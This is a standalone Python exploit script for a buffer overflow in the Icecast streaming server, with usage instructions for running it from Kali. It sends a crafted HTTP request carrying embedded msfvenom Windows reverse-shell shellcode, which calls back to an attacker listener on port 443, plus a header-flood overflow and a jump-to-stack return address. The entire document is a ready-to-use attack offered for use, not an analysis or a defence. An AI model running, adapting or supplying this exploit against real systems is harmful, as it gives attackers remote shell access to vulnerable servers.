#!/usr/bin/env python3
##############################################################################################
# How to use:
# 1. Replace 'buf' shellcode below with msfvenom shellcode
# 2. Call it like this: ./icecast.py <target> <port>
# Eg. root@Kali:~# ./icecast.py 192.168.92.133 8000
##############################################################################################
import socket
import sys

host = sys.argv[1] # Receive IP from user
port = int(sys.argv[2]) # Receive Port from user

# Replace with own shellcode here
# Msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -f python -b '\x00\x0a\x0d'

buf =  ""
buf += "\xb8\x07\xbd\xbb\x1b\xd9\xc2\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e\x03\x44\xb3\x59"
buf += "\xee\xb6\x23\x1f\x11\x46\xb4\x40\x9b\xa3\x85\x40\xff"
buf += "\xa0\xb6\x70\x8b\xe4\x3a\xfa\xd9\x1c\xc8\x8e\xf5\x13"
buf += "\x79\x24\x20\x1a\x7a\x15\x10\x3d\xf8\x64\x45\x9d\xc1"
buf += "\xa6\x98\xdc\x06\xda\x51\x8c\xdf\x90\xc4\x20\x6b\xec"
buf += "\xd4\xcb\x27\xe0\x5c\x28\xff\x03\x4c\xff\x8b\x5d\x4e"
buf += "\xfe\x58\xd6\xc7\x18\xbc\xd3\x9e\x93\x76\xaf\x20\x75"
buf += "\x47\x50\x8e\xb8\x67\xa3\xce\xfd\x40\x5c\xa5\xf7\xb2"
buf += "\xe1\xbe\xcc\xc9\x3d\x4a\xd6\x6a\xb5\xec\x32\x8a\x1a"
buf += "\x6a\xb1\x80\xd7\xf8\x9d\x84\xe6\x2d\x96\xb1\x63\xd0"
buf += "\x78\x30\x37\xf7\x5c\x18\xe3\x96\xc5\xc4\x42\xa6\x15"
buf += "\xa7\x3b\x02\x5e\x4a\x2f\x3f\x3d\x03\x9c\x72\xbd\xd3"
buf += "\x8a\x05\xce\xe1\x15\xbe\x58\x4a\xdd\x18\x9f\xad\xf4"
buf += "\xdd\x0f\x50\xf7\x1d\x06\x97\xa3\x4d\x30\x3e\xcc\x05"
buf += "\xc0\xbf\x19\x89\x90\x6f\xf2\x6a\x40\xd0\xa2\x02\x8a"
buf += "\xdf\x9d\x33\xb5\x35\xb6\xde\x4c\xde\xb3\x15\x6e\x47"
buf += "\xac\x2b\x6e\x6d\x26\xa5\x88\xfb\x26\xe3\x03\x94\xdf"
buf += "\xae\xdf\x05\x1f\x65\x9a\x06\xab\x8a\x5b\xc8\x5c\xe6"
buf += "\x4f\xbd\xac\xbd\x2d\x68\xb2\x6b\x59\xf6\x21\xf0\x99"
buf += "\x71\x5a\xaf\xce\xd6\xac\xa6\x9a\xca\x97\x10\xb8\x16"
buf += "\x41\x5a\x78\xcd\xb2\x65\x81\x80\x8f\x41\x91\x5c\x0f"
buf += "\xce\xc5\x30\x46\x98\xb3\xf6\x30\x6a\x6d\xa1\xef\x24"
buf += "\xf9\x34\xdc\xf6\x7f\x39\x09\x81\x9f\x88\xe4\xd4\xa0"
buf += "\x25\x61\xd1\xd9\x5b\x11\x1e\x30\xd8\x21\x55\x18\x49"
buf += "\xaa\x30\xc9\xcb\xb7\xc2\x24\x0f\xce\x40\xcc\xf0\x35"
buf += "\x58\xa5\xf5\x72\xde\x56\x84\xeb\x8b\x58\x3b\x0b\x9e"


evul = "\xeb\x0c" + " / HTTP/1.1 " + buf + "\r\n" + "Accept: text/html\r\n"*31
evul += "\xff\x64\x24\x04" + "\r\n\r\n"  # jmp [esp+4] 

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Declare a TCP socket
client.connect((host,port))                               #Connect to TCP socket
client.sendall(evul.encode('latin-1'))	                                # Send buffer overflow
client.close()

print("\nDone!")